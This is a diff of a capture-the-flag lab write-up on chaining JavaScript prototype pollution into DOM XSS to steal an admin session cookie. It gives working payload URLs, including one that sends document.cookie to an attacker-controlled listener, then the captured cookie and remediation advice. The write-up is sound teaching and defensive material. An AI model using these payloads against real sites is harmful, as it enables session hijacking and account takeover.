@@ -1,6 +1,6 @@
 <div align="center">
 
-# ☠️ HackSmarter Lab — Prototype Pollution → DOM XSS → Admin Takeover
+# ☠️ HackSmarter Lab  Prototype Pollution → DOM XSS → Admin Takeover
 
 [![Platform](https://img.shields.io/badge/Platform-HackSmarter-darkgreen?style=for-the-badge&logo=linux&logoColor=white)](https://hacksmarter.io)
 [![Points](https://img.shields.io/badge/Points-50-228b22?style=for-the-badge)]()
@@ -32,7 +32,7 @@
 
 ## 🎯 Objective
 
-> *You are a member of the Hack Smarter Red Team. Your organization is beginning to roll out a managed SOC service. You've been provided access to a staging version of the web app before it's pushed to production. The credentials below mirror a customer — are you able to elevate your privileges and become an Administrator?*
+> *You are a member of the Hack Smarter Red Team. Your organization is beginning to roll out a managed SOC service. You've been provided access to a staging version of the web app before it's pushed to production. The credentials below mirror a customer  are you able to elevate your privileges and become an Administrator?*
 
 **Provided credentials:** `pentester : HackSmarter123`  
 **Goal:** Escalate from low-privilege user → Administrator and access the restricted Incident Response panel.
@@ -56,7 +56,7 @@ PORT     STATE SERVICE VERSION
 |_http-title: Hacksmarter | Login
 ```
 
-The application was running on **port 3000** — a common default for Node.js/Express stacks. Accessing `http://10.1.141.30:3000` presented the login panel.
+The application was running on **port 3000**  a common default for Node.js/Express stacks. Accessing `http://10.1.141.30:3000` presented the login panel.
 
 > 💡 **Lesson:** Always port scan before concluding a target is unreachable. In real engagements, apps on non-standard ports are the norm, not the exception.
 
@@ -72,7 +72,7 @@ Logging in with the provided credentials reveals an internal dashboard with thre
 
 ![Internal Dashboard](./internalDashboard.png)
 
-The Incident Response page is gated behind an admin privilege check. The Webmail feature — which allows sending messages to other users, including the admin — is the delivery mechanism for the attack.
+The Incident Response page is gated behind an admin privilege check. The Webmail feature  which allows sending messages to other users, including the admin  is the delivery mechanism for the attack.
 
 ---
 
@@ -80,7 +80,7 @@ The Incident Response page is gated behind an admin privilege check. The Webmail
 
 Inspecting the dashboard's client-side JavaScript exposes two critical functions.
 
-### The Sink — `executeSearch()`
+### The Sink  `executeSearch()`
 
 ```javascript
 function executeSearch() {
@@ -97,7 +97,7 @@ function executeSearch() {
 
 `createContextualFragment()` is the dangerous sink here. Unlike `innerHTML`, it **parses and executes** full HTML including `<script>` tags. If an attacker can control `options.renderCallback`, they achieve arbitrary JavaScript execution in the victim's browser.
 
-### The Source — `syncState()`
+### The Source  `syncState()`
 
 ```javascript
 function syncState(params, target) {
@@ -115,7 +115,7 @@ function syncState(params, target) {
 }
 ```
 
-`syncState` reads the URL hash, splits keys on `.`, and **traverses the object graph** to set the final value. There is no sanitization of dangerous keys — specifically `__proto__`, `constructor`, or `prototype`. This is the prototype pollution vector.
+`syncState` reads the URL hash, splits keys on `.`, and **traverses the object graph** to set the final value. There is no sanitization of dangerous keys  specifically `__proto__`, `constructor`, or `prototype`. This is the prototype pollution vector.
 
 ---
 
@@ -123,22 +123,22 @@ function syncState(params, target) {
 
 ### The JavaScript Prototype Chain
 
-Every JavaScript object inherits properties from a shared ancestor: `Object.prototype`. When a property is accessed on an object, the engine first checks the object itself, then walks up the **prototype chain** until it finds the property or reaches the root. This inheritance mechanism is fundamental to JavaScript — and it is the attack surface.
+Every JavaScript object inherits properties from a shared ancestor: `Object.prototype`. When a property is accessed on an object, the engine first checks the object itself, then walks up the **prototype chain** until it finds the property or reaches the root. This inheritance mechanism is fundamental to JavaScript  and it is the attack surface.
 
 ```javascript
 const obj = {};
-console.log(obj.toString); // not on obj — inherited from Object.prototype
+console.log(obj.toString); // not on obj  inherited from Object.prototype
 ```
 
 ### What Prototype Pollution Actually Is
 
-Prototype Pollution is a vulnerability where an attacker **writes properties directly onto `Object.prototype`** using a user-controlled key like `__proto__`. Because `Object.prototype` sits at the root of the inheritance chain, that injected property is then visible on **every object** in the runtime — including objects the attacker never touched.
+Prototype Pollution is a vulnerability where an attacker **writes properties directly onto `Object.prototype`** using a user-controlled key like `__proto__`. Because `Object.prototype` sits at the root of the inheritance chain, that injected property is then visible on **every object** in the runtime  including objects the attacker never touched.
 
 ```javascript
 // Attacker injects via __proto__
 ({}).__proto__.renderCallback = "<img src=x onerror=alert(1)>";
 
-// Every object now carries the property — including freshly created ones
+// Every object now carries the property  including freshly created ones
 const options = {};
 console.log(options.renderCallback); // "<img src=x onerror=alert(1)>"
 ```
@@ -147,7 +147,7 @@ The critical point: `options` was never modified directly. The attacker wrote to
 
 ### Why This Is More Severe Than Basic Hash-Based XSS
 
-A straightforward hash injection like `#renderCallback=<payload>` sets the property directly on the `options` object — a contained, single-execution side effect that depends on the exact code path running at that moment.
+A straightforward hash injection like `#renderCallback=<payload>` sets the property directly on the `options` object  a contained, single-execution side effect that depends on the exact code path running at that moment.
 
 Prototype pollution is fundamentally different in impact:
 
@@ -156,13 +156,13 @@ Prototype pollution is fundamentally different in impact:
 | **Scope** | Single object instance | Every object in the runtime |
 | **Persistence** | Until `options` is re-declared | Until page reload |
 | **Reachability** | Only if `options.renderCallback` is read | Any object reading `renderCallback` |
-| **Survives re-instantiation?** | No — `let options = {}` resets it | **Yes** — new objects still inherit from polluted prototype |
+| **Survives re-instantiation?** | No  `let options = {}` resets it | **Yes**  new objects still inherit from polluted prototype |
 
-In more complex applications, prototype pollution can reach **completely unrelated code paths** — any code that reads a same-named property on any object becomes a potential sink.
+In more complex applications, prototype pollution can reach **completely unrelated code paths**  any code that reads a same-named property on any object becomes a potential sink.
 
 ### Connection to This Lab
 
-When `syncState` processes `__proto__.renderCallback`, it traverses off the `options` object onto `Object.prototype` and sets `renderCallback` there. From that point, when `executeSearch()` evaluates `if (options.renderCallback)`, the check passes — not because `options` was directly modified, but because `options` inherits the property from the now-poisoned prototype. The payload is then passed into `createContextualFragment()` and executed.
+When `syncState` processes `__proto__.renderCallback`, it traverses off the `options` object onto `Object.prototype` and sets `renderCallback` there. From that point, when `executeSearch()` evaluates `if (options.renderCallback)`, the check passes  not because `options` was directly modified, but because `options` inherits the property from the now-poisoned prototype. The payload is then passed into `createContextualFragment()` and executed.
 
 This is what makes admin cookie theft viable at scale: the prototype is polluted **once** when the admin visits the crafted link, and the payload fires immediately in their browser context.
 
@@ -170,7 +170,7 @@ This is what makes admin cookie theft viable at scale: the prototype is polluted
 
 ## ⚔️ Exploitation
 
-### Step 1 — Confirming DOM XSS via Direct Hash Injection
+### Step 1  Confirming DOM XSS via Direct Hash Injection
 
 Before attempting prototype pollution, the XSS sink was verified with a simple direct injection:
 
@@ -178,13 +178,13 @@ Before attempting prototype pollution, the XSS sink was verified with a simple d
 http://10.1.141.30:3000/dashboard#renderCallback=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
 ```
 
-The alert fired with the current user's session cookie — XSS confirmed.
+The alert fired with the current user's session cookie  XSS confirmed.
 
 ![XSS Cookie Alert](./xssCookie.png)
 
-### Step 2 — Escalating to Prototype Pollution
+### Step 2  Escalating to Prototype Pollution
 
-The direct injection only affects the attacker's own session. To steal the **admin's** cookie, the prototype pollution vector is needed — because it works regardless of how the admin's `options` object was constructed:
+The direct injection only affects the attacker's own session. To steal the **admin's** cookie, the prototype pollution vector is needed  because it works regardless of how the admin's `options` object was constructed:
 
 ```
 http://10.1.141.30:3000/dashboard#__proto__.renderCallback=%3Cimg%20src=x%20onerror=print()%3E
@@ -192,9 +192,9 @@ http://10.1.141.30:3000/dashboard#__proto__.renderCallback=%3Cimg%20src=x%20oner
 
 Confirming `print()` fired via prototype pollution validates the full chain.
 
-### Step 3 — Building the Cookie Exfiltration Payload
+### Step 3  Building the Cookie Exfiltration Payload
 
-An initial attempt using `fetch()` to exfiltrate the cookie did not succeed — likely due to how the browser handles asynchronous requests in the onerror context. Switching to `this.src` — a synchronous image request — resolved the issue:
+An initial attempt using `fetch()` to exfiltrate the cookie did not succeed  likely due to how the browser handles asynchronous requests in the onerror context. Switching to `this.src`  a synchronous image request  resolved the issue:
 
 ```
 http://10.1.141.30:3000/dashboard#__proto__.renderCallback=<img src=x onerror=this.src='http://10.200.51.189:8000/?c='+document.cookie>
@@ -212,13 +212,13 @@ An HTTP listener was started on the attacker machine:
 python3 -m http.server 8000
 ```
 
-### Step 4 — Delivering the Payload via Webmail
+### Step 4  Delivering the Payload via Webmail
 
 The crafted URL was embedded into a message sent to the admin through the platform's Webmail feature:
 
 ![Final Payload Sent](./finalPayload.png)
 
-### Step 5 — Admin Cookie Received
+### Step 5  Admin Cookie Received
 
 When the admin opened the message and visited the link, the browser fired the `onerror` handler, and the cookie arrived at the listener:
 
@@ -234,7 +234,7 @@ user=admin; session=HS_ADMIN_7721_SECURE_AUTH_TOKEN
 
 ## 🚩 Privilege Escalation
 
-With the admin session cookie injected into the browser via DevTools, the previously locked Incident Response page becomes fully accessible:
+With the admin session cookie injected into the browser via Burp, the previously locked Incident Response page becomes fully accessible:
 
 ![Flag Retrieved](./gotFlag.png)
 
@@ -245,7 +245,7 @@ With the admin session cookie injected into the browser via DevTools, the previo
 ## 📖 Vulnerability Summary
 
 <details>
-<summary><strong>🔴 CWE-1321 — Prototype Pollution → CWE-79 — DOM XSS → Session Hijack</strong></summary>
+<summary><strong>🔴 CWE-1321  Prototype Pollution → CWE-79  DOM XSS → Session Hijack</strong></summary>
 
 | Field | Detail |
 |---|---|
@@ -276,7 +276,7 @@ function syncState(params, target) {
     }
 }
 
-// ✅ SECURE — blocklist dangerous prototype keys
+// ✅ SECURE  blocklist dangerous prototype keys
 const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
 
 function syncState(params, target) {
@@ -289,15 +289,15 @@ function syncState(params, target) {
 ### 2. Replace the Dangerous Sink
 
 ```javascript
-// ❌ DANGEROUS — executes arbitrary HTML/JS
+// ❌ DANGEROUS  executes arbitrary HTML/JS
 const frag = document.createRange().createContextualFragment(options.renderCallback);
 
-// ✅ SAFE — plain text only, no execution
+// ✅ SAFE  plain text only, no execution
 const div = document.createElement('div');
 div.textContent = options.renderCallback;
 results.appendChild(div);
 
-// ✅ ALTERNATIVE — use DOMPurify if HTML rendering is genuinely needed
+// ✅ ALTERNATIVE  use DOMPurify if HTML rendering is genuinely needed
 const clean = DOMPurify.sanitize(options.renderCallback);
 results.innerHTML = clean;
 ```
@@ -330,7 +330,7 @@ Object.freeze(Object.prototype);
                   executeSearch() passes options.renderCallback into createContextualFragment()
        ↓
 [Prototype Pollution] → #__proto__.renderCallback=<payload>
-                        Object.prototype poisoned — all objects inherit the value
+                        Object.prototype poisoned  all objects inherit the value
        ↓
 [DOM XSS] → executeSearch() reads inherited renderCallback → payload executes
        ↓
@@ -347,11 +347,11 @@ Object.freeze(Object.prototype);
 
 ## 🧠 Key Takeaways
 
-- **Prototype pollution is a force multiplier.** On its own it looks harmless — paired with a DOM XSS sink it becomes a full privilege escalation chain. Always trace what a pollution primitive reaches downstream.
+- **Prototype pollution is a force multiplier.** On its own it looks harmless  paired with a DOM XSS sink it becomes a full privilege escalation chain. Always trace what a pollution primitive reaches downstream.
 
 - **`__proto__` in user input is always critical.** Any function that recursively assigns object properties from user-controlled data must explicitly block `__proto__`, `constructor`, and `prototype`. No exceptions.
 
-- **`createContextualFragment()` is a high-severity sink.** It's rarely used intentionally. Any occurrence in a codebase should be treated as a finding — the default replacement is `textContent` or DOMPurify-sanitized `innerHTML`.
+- **`createContextualFragment()` is a high-severity sink.** It's rarely used intentionally. Any occurrence in a codebase should be treated as a finding  the default replacement is `textContent` or DOMPurify-sanitized `innerHTML`.
 
 - **`HttpOnly` cookies exist for exactly this reason.** The entire exfiltration step collapses if the session cookie is flagged `HttpOnly`. Set it. Always.
 
